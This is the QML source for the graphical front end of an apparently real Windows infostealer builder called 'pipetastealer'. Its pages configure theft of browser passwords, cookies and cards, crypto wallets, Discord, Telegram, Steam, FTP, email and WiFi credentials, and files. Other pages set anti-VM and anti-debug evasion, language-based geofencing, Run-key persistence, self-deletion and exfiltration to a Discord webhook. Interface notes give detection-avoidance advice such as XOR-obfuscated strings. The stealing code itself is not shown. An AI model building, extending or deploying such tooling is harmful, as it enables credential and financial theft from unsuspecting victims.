import QtQuick
import QtQuick.Controls
import QtQuick.Controls.Basic
import QtQuick.Layouts

// ============================================================
//  pwnd.blog palette — single source of truth
//  bg #050505 · surface #0d0d0d · line #1a1a1a · text #d1d5db
//  dim #6b7280 · accent #d946ef · accentSoft #e879f9
//  ok #22c55e · err #ef4444 · mono: JetBrains Mono
// ============================================================

ApplicationWindow {
    id: window

    visible: true
    width: 1180
    height: 840
    minimumWidth: 900
    minimumHeight: 620
    title: "pipetastealer · builder"
    color: "#050505"

    property int pageIndex: 0
    property var pageComponents: [dashPage, coletaPage, stealthPage, geofencePage,
                                  persistenciaPage, grabberPage, blocklistPage, exfilPage]

    // navigation grouped by context — indices point into navModel
    property var navGroups: [
        { label: "overview", items: [0] },
        { label: "modules", items: [1, 2, 3, 4] },
        { label: "targets", items: [5, 6] },
        { label: "output", items: [7] }
    ]

    // status tone: purple building, green ok, red failure, gray idle
    readonly property color statusTone: backend.building ? "#e879f9"
                                        : backend.status.indexOf("ok") === 0 ? "#22c55e"
                                        : backend.status.indexOf("failed") === 0 ? "#ef4444"
                                        : "#6b7280"

    function pageTitle() {
        return navModel.get(window.pageIndex).title
    }

    function pad2(n) {
        return (n < 10 ? "0" : "") + n
    }

    ListModel {
        id: navModel
        ListElement { title: "dashboard"; sub: "overview + build" }
        ListElement { title: "collection"; sub: "credentials and files" }
        ListElement { title: "stealth"; sub: "evasion and opsec" }
        ListElement { title: "geofence"; sub: "region filter" }
        ListElement { title: "persistence"; sub: "host survival" }
        ListElement { title: "file grabber"; sub: "targets and extensions" }
        ListElement { title: "blocklist"; sub: "blocked processes" }
        ListElement { title: "exfiltration"; sub: "outbound webhook" }
    }

    ColumnLayout {
        anchors.fill: parent
        spacing: 0

        // ================= HEADER =================
        Rectangle {
            id: topBar
            Layout.fillWidth: true
            implicitHeight: 64
            color: "#0a0a0a"

            gradient: Gradient {
                GradientStop { position: 0.0; color: "#101010" }
                GradientStop { position: 1.0; color: "#090909" }
            }

            // bottom hairline
            Rectangle {
                anchors.left: parent.left
                anchors.right: parent.right
                anchors.bottom: parent.bottom
                height: 1
                color: "#1a1a1a"
            }

            // indeterminate progress sweep while building
            Rectangle {
                visible: backend.building
                anchors.left: parent.left
                anchors.bottom: parent.bottom
                height: 2
                width: topBar.width * 0.3
                gradient: Gradient {
                    orientation: Gradient.Horizontal
                    GradientStop { position: 0.0; color: "#00000000" }
                    GradientStop { position: 0.5; color: "#d946ef" }
                    GradientStop { position: 1.0; color: "#00000000" }
                }
                SequentialAnimation on x {
                    running: backend.building
                    loops: Animation.Infinite
                    NumberAnimation { from: -topBar.width * 0.3; to: topBar.width; duration: 1100; easing.type: Easing.InOutSine }
                }
            }

            RowLayout {
                anchors.fill: parent
                anchors.leftMargin: 18
                anchors.rightMargin: 18
                spacing: 14

                // brand mark
                Rectangle {
                    Layout.alignment: Qt.AlignVCenter
                    implicitWidth: 34
                    implicitHeight: 34
                    radius: 10

                    gradient: Gradient {
                        GradientStop { position: 0.0; color: "#e879f9" }
                        GradientStop { position: 1.0; color: "#a21caf" }
                    }

                    Rectangle {
                        anchors.fill: parent
                        anchors.margins: 1
                        radius: 9
                        color: "transparent"
                        border.width: 1
                        border.color: Qt.rgba(1, 1, 1, 0.22)
                    }

                    Label {
                        anchors.centerIn: parent
                        text: "PT"
                        color: "#050505"
                        font.family: "JetBrains Mono"
                        font.pixelSize: 12
                        font.bold: true
                        font.letterSpacing: 0.5
                    }
                }

                ColumnLayout {
                    Layout.alignment: Qt.AlignVCenter
                    spacing: 0
                    Label {
                        text: "pipetastealer"
                        color: "#f5d0fe"
                        font.family: "JetBrains Mono"
                        font.pixelSize: 14
                        font.bold: true
                        font.letterSpacing: 0.4
                    }
                    Label {
                        text: "builder"
                        color: "#6b7280"
                        font.family: "JetBrains Mono"
                        font.pixelSize: 9
                        font.letterSpacing: 2.4
                        font.capitalization: Font.AllUppercase
                    }
                }

                Rectangle {
                    Layout.alignment: Qt.AlignVCenter
                    Layout.leftMargin: 2
                    Layout.rightMargin: 2
                    implicitWidth: 1
                    implicitHeight: 30
                    color: "#1f1f1f"
                }

                ColumnLayout {
                    Layout.alignment: Qt.AlignVCenter
                    spacing: 1
                    Layout.fillWidth: true
                    Label {
                        text: window.pageTitle()
                        color: "#e5e7eb"
                        font.family: "JetBrains Mono"
                        font.pixelSize: 12
                        font.bold: true
                    }
                    Label {
                        text: backend.projeto
                        color: "#4b4b53"
                        font.family: "JetBrains Mono"
                        font.pixelSize: 9
                        elide: Text.ElideMiddle
                        Layout.fillWidth: true
                    }
                }

                // status pill
                Rectangle {
                    Layout.alignment: Qt.AlignVCenter
                    implicitWidth: statusRow.implicitWidth + 24
                    implicitHeight: 30
                    radius: 9
                    color: Qt.rgba(window.statusTone.r, window.statusTone.g, window.statusTone.b, 0.07)
                    border.width: 1
                    border.color: Qt.rgba(window.statusTone.r, window.statusTone.g, window.statusTone.b, 0.30)

                    RowLayout {
                        id: statusRow
                        anchors.centerIn: parent
                        spacing: 8
                        Rectangle {
                            Layout.alignment: Qt.AlignVCenter
                            implicitWidth: 7
                            implicitHeight: 7
                            radius: 4
                            color: window.statusTone
                        }
                        Label {
                            text: backend.status
                            color: "#d1d5db"
                            font.family: "JetBrains Mono"
                            font.pixelSize: 11
                        }
                    }
                }

                ActionButton {
                    Layout.alignment: Qt.AlignVCenter
                    label: backend.building ? "compiling"
                                            : backend.build_count > 0 && !backend.last_build_ok ? "try again"
                                            : backend.build_count > 0 ? "rebuild"
                                            : "build"
                    fill: backend.building ? "#141414" : "#d946ef"
                    fg: backend.building ? "#6b7280" : "#050505"
                    enabled: !backend.building
                    onClicked: backend.build()
                }
            }
        }

        // ================= BODY =================
        RowLayout {
            Layout.fillWidth: true
            Layout.fillHeight: true
            spacing: 0

            // ---------- NAV ----------
            Rectangle {
                Layout.preferredWidth: 236
                Layout.fillHeight: true
                color: "#080808"

                gradient: Gradient {
                    GradientStop { position: 0.0; color: "#0b0b0b" }
                    GradientStop { position: 1.0; color: "#070707" }
                }

                Rectangle {
                    anchors.right: parent.right
                    anchors.top: parent.top
                    anchors.bottom: parent.bottom
                    width: 1
                    color: "#1a1a1a"
                }

                ColumnLayout {
                    anchors.fill: parent
                    anchors.leftMargin: 12
                    anchors.rightMargin: 12
                    anchors.topMargin: 16
                    anchors.bottomMargin: 12
                    spacing: 2

                    Repeater {
                        model: window.navGroups

                        delegate: ColumnLayout {
                            Layout.fillWidth: true
                            Layout.bottomMargin: 6
                            spacing: 2

                            Label {
                                text: modelData.label
                                color: "#4b4b53"
                                font.family: "JetBrains Mono"
                                font.pixelSize: 9
                                font.letterSpacing: 2.0
                                font.capitalization: Font.AllUppercase
                                Layout.leftMargin: 6
                                Layout.topMargin: 8
                                Layout.bottomMargin: 4
                            }

                            Repeater {
                                model: modelData.items

                                delegate: NavRow {
                                    title: navModel.get(modelData).title
                                    code: window.pad2(modelData + 1)
                                    active: window.pageIndex === modelData
                                    onPicked: window.pageIndex = modelData
                                }
                            }
                        }
                    }

                    Item { Layout.fillHeight: true }

                    Rectangle {
                        Layout.fillWidth: true
                        implicitHeight: 1
                        color: "#1a1a1a"
                        Layout.topMargin: 8
                        Layout.bottomMargin: 10
                    }

                    MetaRow { label: "target"; value: backend.target }
                    MetaRow { label: "optimize"; value: backend.optimize }
                    MetaRow {
                        label: "last build"
                        value: backend.build_count === 0 ? "never"
                             : backend.last_build_size_kb + " KB · " + (backend.last_build_ms / 1000).toFixed(1) + "s"
                        tone: backend.build_count === 0 ? "#6b7280"
                            : backend.last_build_ok ? "#22c55e" : "#ef4444"
                    }
                }
            }

            // ---------- PAGES ----------
            Item {
                Layout.fillWidth: true
                Layout.fillHeight: true

                // ambient background
                Rectangle {
                    anchors.fill: parent
                    color: "#050505"
                }

                // faint magenta glow at the top
                Rectangle {
                    anchors.left: parent.left
                    anchors.right: parent.right
                    anchors.top: parent.top
                    height: 220
                    gradient: Gradient {
                        GradientStop { position: 0.0; color: Qt.rgba(0.851, 0.275, 0.937, 0.05) }
                        GradientStop { position: 1.0; color: "#00000000" }
                    }
                }

                ScrollView {
                    id: pageScroll
                    anchors.fill: parent
                    clip: true
                    contentWidth: availableWidth
                    contentHeight: pageLoader.item ? pageLoader.item.implicitHeight : 0

                    ScrollBar.horizontal.policy: ScrollBar.AlwaysOff
                    ScrollBar.vertical: ScrollBar {
                        id: pageBar
                        policy: ScrollBar.AsNeeded
                        implicitWidth: 10
                        background: Rectangle { color: "transparent" }
                        contentItem: Rectangle {
                            implicitWidth: 4
                            radius: 2
                            color: pageBar.pressed ? "#d946ef" : "#242424"
                        }
                    }

                    Loader {
                        id: pageLoader
                        width: pageScroll.availableWidth - 36
                        x: 18
                        y: 18
                        sourceComponent: window.pageComponents[window.pageIndex]

                        onSourceComponentChanged: pageFade.restart()
                        onLoaded: pageFade.restart()
                    }
                }

                SequentialAnimation {
                    id: pageFade
                    NumberAnimation {
                        target: pageLoader
                        property: "opacity"
                        from: 0
                        to: 1
                        duration: 200
                        easing.type: Easing.OutCubic
                    }
                }

                Connections {
                    target: window
                    function onPageIndexChanged() { pageFade.restart() }
                }
            }
        }

        // ================= STATUS BAR =================
        Rectangle {
            Layout.fillWidth: true
            implicitHeight: 28
            color: "#0a0a0a"

            Rectangle {
                anchors.left: parent.left
                anchors.right: parent.right
                anchors.top: parent.top
                height: 1
                color: "#1a1a1a"
            }

            RowLayout {
                anchors.fill: parent
                anchors.leftMargin: 18
                anchors.rightMargin: 18
                spacing: 14

                Rectangle {
                    Layout.alignment: Qt.AlignVCenter
                    implicitWidth: 7
                    implicitHeight: 7
                    radius: 4
                    color: window.statusTone
                }

                Label {
                    text: backend.building ? "building with zig build…" : "ready"
                    color: window.statusTone
                    font.family: "JetBrains Mono"
                    font.pixelSize: 10
                }

                Item { Layout.fillWidth: true }

                Label {
                    text: "active modules " + (backend.coleta_ativos + backend.stealth_ativos + backend.persistencia_ativos)
                          + "/" + (backend.coleta_total + backend.stealth_total + backend.persistencia_total)
                    color: "#6b7280"
                    font.family: "JetBrains Mono"
                    font.pixelSize: 10
                }

                Rectangle { implicitWidth: 1; implicitHeight: 12; color: "#1a1a1a" }

                Label {
                    text: backend.target + " · " + backend.optimize
                    color: "#6b7280"
                    font.family: "JetBrains Mono"
                    font.pixelSize: 10
                }

                Rectangle { implicitWidth: 1; implicitHeight: 12; color: "#1a1a1a" }

                Label {
                    text: backend.toolchain
                    color: backend.toolchain_ok ? "#6b7280" : "#ef4444"
                    font.family: "JetBrains Mono"
                    font.pixelSize: 10
                }
            }
        }
    }

    // ==========================================================
    //  PAGES
    // ==========================================================

    // ---------- 01 DASHBOARD ----------
    Component {
        id: dashPage
        ColumnLayout {
            width: pageLoader.width
            spacing: 16

            RowLayout {
                Layout.fillWidth: true
                spacing: 14

                StatCard {
                    label: "collection modules"
                    value: backend.coleta_ativos + "/" + backend.coleta_total
                    sub: "credentials, sessions and files"
                    accent: "#d946ef"
                    progress: backend.coleta_ativos / backend.coleta_total
                }
                StatCard {
                    label: "stealth"
                    value: backend.stealth_ativos + "/" + backend.stealth_total
                    sub: "evasion on"
                    accent: "#e879f9"
                    progress: backend.stealth_ativos / backend.stealth_total
                }
                StatCard {
                    label: "persistence"
                    value: backend.persistencia_ativos === 0 ? "off" : backend.persistencia_ativos + "/" + backend.persistencia_total
                    sub: backend.persistencia_ativos === 0 ? "single run" : "survives reboot"
                    accent: backend.persistencia_ativos === 0 ? "#6b7280" : "#22c55e"
                    progress: backend.persistencia_ativos / backend.persistencia_total
                }
                StatCard {
                    label: "geofence"
                    value: backend.geofence_langids_total === 0 ? "off" : backend.geofence_langids_total + " langids"
                    sub: backend.geofence_langids_total === 0 ? "runs in any region" : backend.geofence
                    accent: backend.geofence_langids_total === 0 ? "#6b7280" : "#e879f9"
                    progress: Math.min(1, backend.geofence_langids_total / 9)
                }
            }

            Card {
                title: "active modules"
                hint: "what goes into the exe"
                badge: (backend.coleta_ativos + backend.stealth_ativos + backend.persistencia_ativos)
                       + "/" + (backend.coleta_total + backend.stealth_total + backend.persistencia_total) + " on"

                Flow {
                    Layout.fillWidth: true
                    Layout.preferredHeight: implicitHeight
                    spacing: 6

                    Repeater {
                        model: backend.modulos
                        delegate: Chip {
                            label: modelData.name
                            on: modelData.on
                            accent: modelData.group === "coleta" ? "#d946ef"
                                  : modelData.group === "stealth" ? "#e879f9"
                                  : "#22c55e"
                        }
                    }
                }
            }

            Card {
                title: "build"
                hint: "generates src/ajuste.zig and compiles"
                badge: backend.build_count === 0 ? "never built" : "build #" + backend.build_count

                RowLayout {
                    Layout.fillWidth: true
                    spacing: 16

                    ColumnLayout {
                        Layout.fillWidth: true
                        Layout.minimumWidth: 0
                        spacing: 7
                        FieldLabel { text: "optimize" }
                        Segmented {
                            Layout.fillWidth: true
                            options: ["Debug", "ReleaseFast", "ReleaseSmall"]
                            current: Math.max(0, ["Debug", "ReleaseFast", "ReleaseSmall"].indexOf(backend.optimize))
                            onPicked: (index) => backend.optimize = options[index]
                        }
                    }

                    ColumnLayout {
                        Layout.fillWidth: true
                        Layout.minimumWidth: 0
                        spacing: 7
                        FieldLabel { text: "target" }
                        Segmented {
                            Layout.fillWidth: true
                            options: ["x86_64-windows-gnu"]
                            current: Math.max(0, ["x86_64-windows-gnu"].indexOf(backend.target))
                            onPicked: (index) => backend.target = options[index]
                        }
                    }
                }

                RowLayout {
                    Layout.fillWidth: true
                    Layout.topMargin: 2
                    spacing: 10

                    MiniStat { label: "size"; value: backend.last_build_size_kb > 0 ? backend.last_build_size_kb + " KB" : "—" }
                    MiniStat { label: "duration"; value: backend.last_build_ms > 0 ? (backend.last_build_ms / 1000).toFixed(1) + "s" : "—" }
                    MiniStat { label: "time"; value: backend.last_build_when }
                    MiniStat {
                        label: "status"
                        value: backend.build_count === 0 ? "—" : backend.last_build_ok ? "ok" : "failed"
                        tone: backend.build_count === 0 ? "#6b7280" : backend.last_build_ok ? "#22c55e" : "#ef4444"
                    }
                }

                ActionButton {
                    Layout.fillWidth: true
                    Layout.preferredHeight: 44
                    Layout.topMargin: 4
                    label: backend.building ? "compiling…" : "build"
                    fill: backend.building ? "#141414" : "#d946ef"
                    fg: backend.building ? "#6b7280" : "#050505"
                    enabled: !backend.building
                    onClicked: backend.build()
                }
            }

            RowLayout {
                Layout.fillWidth: true
                spacing: 16

                Card {
                    title: "console"
                    hint: "zig build in real time"
                    badge: backend.building ? "running"
                         : backend.output.length === 0 ? "empty"
                         : (backend.output.split("\n").length - 1) + " lines"

                    Layout.preferredWidth: 3
                    Layout.horizontalStretchFactor: 3

                    // terminal-style dots
                    RowLayout {
                        Layout.fillWidth: true
                        spacing: 6
                        Rectangle { implicitWidth: 9; implicitHeight: 9; radius: 5; color: "#ef4444"; opacity: 0.65 }
                        Rectangle { implicitWidth: 9; implicitHeight: 9; radius: 5; color: "#eab308"; opacity: 0.65 }
                        Rectangle { implicitWidth: 9; implicitHeight: 9; radius: 5; color: "#22c55e"; opacity: 0.65 }
                        Item { Layout.fillWidth: true }
                    }

                    Flickable {
                        id: consoleFlick
                        Layout.fillWidth: true
                        Layout.preferredHeight: 160
                        clip: true
                        contentWidth: width
                        contentHeight: consoleArea.height

                        TextArea {
                            id: consoleArea
                            width: consoleFlick.width
                            height: Math.max(consoleFlick.height, contentHeight + 20)
                            text: backend.output
                            readOnly: true
                            selectByMouse: true
                            wrapMode: TextArea.NoWrap
                            font.family: "JetBrains Mono"
                            font.pixelSize: 11
                            color: "#22c55e"
                            placeholderText: "$ waiting for build…"
                            placeholderTextColor: "#4b4b53"
                            padding: 10
                            background: Rectangle {
                                color: "#070707"
                                radius: 8
                                border.width: 1
                                border.color: "#1a1a1a"
                            }

                            onTextChanged: consoleFlick.contentY = Math.max(0, consoleFlick.contentHeight - consoleFlick.height)
                        }
                    }
                }

                Card {
                    title: "output"
                    hint: "generated artifact"
                    badge: backend.last_build_ok ? backend.last_build_size_kb + " KB" : ""

                    Layout.preferredWidth: 2
                    Layout.horizontalStretchFactor: 2

                    Label {
                        Layout.fillWidth: true
                        text: backend.exe_path
                        color: "#d1d5db"
                        font.family: "JetBrains Mono"
                        font.pixelSize: 10
                        wrapMode: Text.WrapAnywhere
                    }

                    Rectangle {
                        Layout.fillWidth: true
                        implicitHeight: 1
                        color: "#1a1a1a"
                    }

                    KeyValue { label: "ajuste.zig"; value: backend.geofence_langids_total + " langids · " + backend.extensoes_total + " extensions" }
                    KeyValue { label: "file grabber"; value: backend.pegador_arquivos ? backend.tamanho_max_arquivo + " MB per file" : "off" }
                    KeyValue { label: "blocklist"; value: backend.blocklist_total + " processes" }
                    KeyValue { label: "webhook"; value: backend.webhook_ok ? "configured" : "placeholder"; tone: backend.webhook_ok ? "#22c55e" : "#ef4444" }

                    Item { Layout.fillHeight: true }
                }
            }

            Card {
                title: "ajuste.zig"
                hint: "config injected into the binary"
                badge: "src/ajuste.zig"
                collapsible: true
                open: false

                Flickable {
                    id: previewFlick
                    Layout.fillWidth: true
                    Layout.preferredHeight: 150
                    clip: true
                    contentWidth: width
                    contentHeight: previewArea.height

                    TextArea {
                        id: previewArea
                        width: previewFlick.width
                        height: Math.max(previewFlick.height, contentHeight + 20)
                        text: backend.ajuste_preview
                        readOnly: true
                        selectByMouse: true
                        wrapMode: TextArea.NoWrap
                        font.family: "JetBrains Mono"
                        font.pixelSize: 11
                        color: "#9ca3af"
                        padding: 10
                        background: Rectangle {
                            color: "#070707"
                            radius: 8
                            border.width: 1
                            border.color: "#1a1a1a"
                        }
                    }
                }
            }
        }
    }

    // ---------- 02 COLLECTION ----------
    Component {
        id: coletaPage
        ColumnLayout {
            width: pageLoader.width
            spacing: 16

            Card {
                title: "collection"
                hint: "what leaves the target machine"
                badge: backend.coleta_ativos + "/" + backend.coleta_total

                GridLayout {
                    Layout.fillWidth: true
                    columns: window.width > 1000 ? 2 : 1
                    columnSpacing: 16
                    rowSpacing: 2

                    ToggleRow { title: "Browsers"; sub: "passwords, cookies, cards, history"
                                on: backend.roubar_navegadores; onToggled: (state) => backend.roubar_navegadores = state }
                    ToggleRow { title: "Crypto wallets"; sub: "12 extensions + 8 desktop"
                                on: backend.roubar_crypto; onToggled: (state) => backend.roubar_crypto = state }
                    ToggleRow { title: "Discord"; sub: "plaintext tokens + DPAPI"
                                on: backend.roubar_discord; onToggled: (state) => backend.roubar_discord = state }
                    ToggleRow { title: "Telegram"; sub: "tdata"
                                on: backend.roubar_telegram; onToggled: (state) => backend.roubar_telegram = state }
                    ToggleRow { title: "Steam"; sub: "ssfn + config + registry"
                                on: backend.roubar_steam; onToggled: (state) => backend.roubar_steam = state }
                    ToggleRow { title: "FileZilla"; sub: "FTP credentials"
                                on: backend.roubar_filezilla; onToggled: (state) => backend.roubar_filezilla = state }
                    ToggleRow { title: "Outlook"; sub: "Windows Credential Manager"
                                on: backend.roubar_outlook; onToggled: (state) => backend.roubar_outlook = state }
                    ToggleRow { title: "Thunderbird"; sub: "NSS"
                                on: backend.roubar_thunderbird; onToggled: (state) => backend.roubar_thunderbird = state }
                    ToggleRow { title: "WiFi"; sub: "profiles + passwords"
                                on: backend.roubar_wifi; onToggled: (state) => backend.roubar_wifi = state }
                    ToggleRow { title: "File Grabber"; sub: "recursive scan"
                                on: backend.pegador_arquivos; onToggled: (state) => backend.pegador_arquivos = state }
                    ToggleRow { title: "Screenshot"; sub: "JPEG via GDI+"
                                on: backend.tirar_captura; onToggled: (state) => backend.tirar_captura = state }
                    ToggleRow { title: "System info"; sub: "OS, CPU, RAM, IP"
                                on: backend.coletar_info_sistema; onToggled: (state) => backend.coletar_info_sistema = state }
                }
            }

            Note {
                tone: "#e879f9"
                text: "every disabled module is also dropped from ajuste.zig — dead code never reaches the binary, and the detection surface shrinks with it."
            }
        }
    }

    // ---------- 03 STEALTH ----------
    Component {
        id: stealthPage
        ColumnLayout {
            width: pageLoader.width
            spacing: 16

            Card {
                title: "stealth & evasion"
                hint: "trying to pass as a real machine"
                badge: backend.stealth_ativos + "/" + backend.stealth_total

                GridLayout {
                    Layout.fillWidth: true
                    columns: window.width > 1000 ? 2 : 1
                    columnSpacing: 16
                    rowSpacing: 2

                    ToggleRow { title: "Anti-VM"; sub: "CPUID + MAC + sandbox DLLs + sleep skew"
                                on: backend.anti_vm; onToggled: (state) => backend.anti_vm = state }
                    ToggleRow { title: "Anti-debug"; sub: "PEB + rdtsc + CheckRemoteDebugger"
                                on: backend.anti_debug; onToggled: (state) => backend.anti_debug = state }
                    ToggleRow { title: "Human interaction"; sub: "mouse + keyboard"
                                on: backend.human_interaction; onToggled: (state) => backend.human_interaction = state }
                }
            }

            Note {
                tone: "#e879f9"
                text: "with everything on, the binary gets bigger and slower on cold start. anti-VM is usually the first to fall in a client sandbox."
            }
        }
    }

    // ---------- 04 GEOFENCE ----------
    Component {
        id: geofencePage
        ColumnLayout {
            width: pageLoader.width
            spacing: 16

            Card {
                title: "geofence"
                hint: "aborts if the host language doesn't match"
                badge: backend.geofence_custom.trim() !== "" ? "custom override active"
                     : backend.geofence_langids_total === 0 ? "off"
                     : backend.geofence_langids_total + " langids"

                GridLayout {
                    Layout.fillWidth: true
                    columns: window.width > 1000 ? 2 : 1
                    columnSpacing: 16
                    rowSpacing: 8
                    enabled: backend.geofence_custom.trim() === ""
                    opacity: backend.geofence_custom.trim() === "" ? 1 : 0.45
                    Behavior on opacity { NumberAnimation { duration: 140 } }

                    OptionCard { label: "none"; sub: "runs on any host"; selected: backend.geofence === "none"
                                 onPicked: () => backend.geofence = "none" }
                    OptionCard { label: "cis"; sub: "RU / UA / BY"; selected: backend.geofence === "cis"
                                 onPicked: () => backend.geofence = "cis" }
                    OptionCard { label: "asia"; sub: "CN / KP / JP"; selected: backend.geofence === "asia"
                                 onPicked: () => backend.geofence = "asia" }
                    OptionCard { label: "middle_east"; sub: "IR / IQ / SY"; selected: backend.geofence === "middle_east"
                                 onPicked: () => backend.geofence = "middle_east" }
                    OptionCard { label: "all_except_western"; sub: "all presets combined"; selected: backend.geofence === "all_except_western"
                                 Layout.columnSpan: window.width > 1000 ? 2 : 1
                                 onPicked: () => backend.geofence = "all_except_western" }
                }

                Rectangle {
                    Layout.fillWidth: true
                    implicitHeight: 1
                    color: "#1a1a1a"
                }

                FieldLabel { text: "effective langids" }
                Label {
                    Layout.fillWidth: true
                    text: backend.geofence_langids_label
                    color: backend.geofence_langids_total === 0 ? "#6b7280" : "#d1d5db"
                    font.family: "JetBrains Mono"
                    font.pixelSize: 11
                    wrapMode: Text.WrapAnywhere
                }

                FieldLabel { text: "custom langids (overrides the preset)" }
                InputBox {
                    Layout.fillWidth: true
                    value: backend.geofence_custom
                    placeholder: "0x0419,0x0422,0x0423"
                    onEdited: (text) => backend.geofence_custom = text
                }
            }

            Note {
                tone: backend.geofence_custom.trim() !== "" ? "#ef4444" : "#e879f9"
                text: backend.geofence_custom.trim() !== ""
                      ? "custom override active: the region selection above is being ignored — ajuste.zig ships with the langids you typed."
                      : "an empty custom langid falls back to the preset. once filled, it ignores the selection above — double-check the result before building."
            }
        }
    }

    // ---------- 05 PERSISTENCE ----------
    Component {
        id: persistenciaPage
        ColumnLayout {
            width: pageLoader.width
            spacing: 16

            Card {
                title: "persistence"
                hint: "what happens after the first run"
                badge: backend.persistencia_ativos + "/" + backend.persistencia_total

                ColumnLayout {
                    Layout.fillWidth: true
                    spacing: 2

                    ToggleRow { title: "HKCU Run key"; sub: "starts with the user's login"
                                on: backend.persistir; onToggled: (state) => backend.persistir = state }
                    ToggleRow { title: "Self-delete"; sub: "rename-and-reopen, vanishes from disk"
                                on: backend.auto_destruir; onToggled: (state) => backend.auto_destruir = state }
                }
            }

            Note {
                tone: backend.persistir ? "#ef4444" : "#6b7280"
                text: backend.persistir
                      ? "run key on: the binary stays resident and becomes a permanent IOC on the host — a re-scan is more likely to catch it with EDR."
                      : "without persistence the binary runs once and dies. smaller footprint, less recurrence."
            }
        }
    }

    // ---------- 06 FILE GRABBER ----------
    Component {
        id: grabberPage
        ColumnLayout {
            width: pageLoader.width
            spacing: 16

            Card {
                title: "file grabber"
                hint: "file scan by extension"
                badge: backend.pegador_arquivos ? "on" : "off"

                RowLayout {
                    Layout.fillWidth: true
                    spacing: 12

                    FieldLabel { text: "limit per file"; Layout.alignment: Qt.AlignVCenter }

                    Stepper {
                        value: backend.tamanho_max_arquivo
                        from: 1
                        to: 50
                        suffix: " MB"
                        onStepped: (v) => backend.tamanho_max_arquivo = v
                    }

                    Item { Layout.fillWidth: true }
                }

                FieldLabel { text: "scanned paths" }
                InputBox {
                    Layout.fillWidth: true
                    value: backend.caminhos_pegador
                    placeholder: "Desktop,Documents,Downloads"
                    onEdited: (text) => backend.caminhos_pegador = text
                }

                FieldLabel { text: "extensions  ·  " + backend.extensoes_total + " targets" }
                InputArea {
                    Layout.fillWidth: true
                    Layout.preferredHeight: 96
                    value: backend.extensoes_arquivo
                    onEdited: (text) => backend.extensoes_arquivo = text
                }
            }

            Note {
                tone: "#e879f9"
                text: "the extension and path lists ship XOR-obfuscated inside the binary — they never show up in the exe's strings."
            }
        }
    }

    // ---------- 07 BLOCKLIST ----------
    Component {
        id: blocklistPage
        ColumnLayout {
            width: pageLoader.width
            spacing: 16

            Card {
                title: "process blocklist"
                hint: "aborts if any of these is running"
                badge: backend.blocklist_total + " processes"

                FieldLabel { text: "one name per line" }
                InputArea {
                    Layout.fillWidth: true
                    Layout.preferredHeight: 300
                    value: backend.process_blocklist
                    onEdited: (text) => backend.process_blocklist = text
                }
            }
        }
    }

    // ---------- 08 EXFILTRATION ----------
    Component {
        id: exfilPage
        ColumnLayout {
            width: pageLoader.width
            spacing: 16

            Card {
                title: "exfiltration"
                hint: "destination for everything collected"
                badge: backend.webhook_ok ? "configured" : "placeholder"

                FieldLabel { text: "webhook url" }
                InputBox {
                    Layout.fillWidth: true
                    value: backend.webhook_url
                    placeholder: "https://discord.com/api/webhooks/…"
                    onEdited: (text) => backend.webhook_url = text
                }

                Rectangle {
                    Layout.fillWidth: true
                    implicitHeight: 44
                    radius: 9
                    color: backend.webhook_ok ? Qt.rgba(0.133, 0.773, 0.369, 0.08) : Qt.rgba(0.937, 0.267, 0.267, 0.08)
                    border.width: 1
                    border.color: backend.webhook_ok ? Qt.rgba(0.133, 0.773, 0.369, 0.35) : Qt.rgba(0.937, 0.267, 0.267, 0.35)

                    RowLayout {
                        anchors.fill: parent
                        anchors.leftMargin: 12
                        anchors.rightMargin: 12
                        spacing: 8

                        Rectangle {
                            Layout.alignment: Qt.AlignVCenter
                            implicitWidth: 7
                            implicitHeight: 7
                            radius: 4
                            color: backend.webhook_ok ? "#22c55e" : "#ef4444"
                        }
                        Label {
                            Layout.fillWidth: true
                            text: backend.webhook_ok
                                  ? "endpoint ready: host and path go into ajuste.zig"
                                  : "url is still the placeholder — replace it before building"
                            color: backend.webhook_ok ? "#22c55e" : "#ef4444"
                            font.family: "JetBrains Mono"
                            font.pixelSize: 11
                            elide: Text.ElideRight
                        }
                    }
                }

                Label {
                    Layout.fillWidth: true
                    text: "host: " + backend.webhook_host + "   ·   path: " + backend.webhook_path
                    color: "#6b7280"
                    font.family: "JetBrains Mono"
                    font.pixelSize: 10
                    elide: Text.ElideMiddle
                }
            }

            Note {
                tone: "#e879f9"
                text: "the payload leaves in multipart chunks to the same webhook. discord throttles long bursts — for high volume, split it across two hooks."
            }
        }
    }

    // ==========================================================
    //  COMPONENTS
    // ==========================================================

    component Card : Rectangle {
        id: card
        property string title: ""
        property string hint: ""
        property string badge: ""
        property color accent: "#d946ef"
        property bool collapsible: false
        property bool open: true
        default property alias body: bodyCol.data

        Layout.fillWidth: true
        implicitHeight: col.implicitHeight + 34
        radius: 12

        gradient: Gradient {
            GradientStop { position: 0.0; color: cardHover.hovered ? "#111111" : "#0f0f0f" }
            GradientStop { position: 1.0; color: "#0a0a0a" }
        }
        border.width: 1
        border.color: cardHover.hovered ? "#242424" : "#1a1a1a"
        Behavior on border.color { ColorAnimation { duration: 140 } }

        // top highlight hairline
        Rectangle {
            anchors.left: parent.left
            anchors.right: parent.right
            anchors.top: parent.top
            anchors.margins: 1
            height: 1
            radius: parent.radius
            color: Qt.rgba(1, 1, 1, 0.03)
        }

        ColumnLayout {
            id: col
            anchors.left: parent.left
            anchors.right: parent.right
            anchors.top: parent.top
            anchors.margins: 17
            spacing: 13

            RowLayout {
                Layout.fillWidth: true
                spacing: 10
                visible: card.title !== ""

                Rectangle {
                    Layout.alignment: Qt.AlignVCenter
                    implicitWidth: 3
                    implicitHeight: 14
                    radius: 2
                    color: card.accent
                }
                Label {
                    text: card.title
                    color: "#e879f9"
                    font.family: "JetBrains Mono"
                    font.pixelSize: 11
                    font.bold: true
                    font.letterSpacing: 1.5
                    font.capitalization: Font.AllUppercase
                }
                Label {
                    Layout.fillWidth: true
                    Layout.minimumWidth: 0
                    Layout.preferredWidth: 0
                    text: card.hint
                    color: "#4b4b53"
                    font.family: "JetBrains Mono"
                    font.pixelSize: 10
                    elide: Text.ElideRight
                }

                // badge pill
                Rectangle {
                    visible: card.badge !== ""
                    implicitWidth: badgeLabel.implicitWidth + 18
                    implicitHeight: 22
                    radius: 6
                    color: "#141414"
                    border.width: 1
                    border.color: "#202020"
                    Label {
                        id: badgeLabel
                        anchors.centerIn: parent
                        text: card.badge
                        color: "#8b8b93"
                        font.family: "JetBrains Mono"
                        font.pixelSize: 9
                    }
                }

                Label {
                    text: card.open ? "−" : "+"
                    visible: card.collapsible
                    color: "#6b7280"
                    font.family: "JetBrains Mono"
                    font.pixelSize: 14
                }
            }

            ColumnLayout {
                id: bodyCol
                Layout.fillWidth: true
                spacing: 10
                visible: card.open
            }
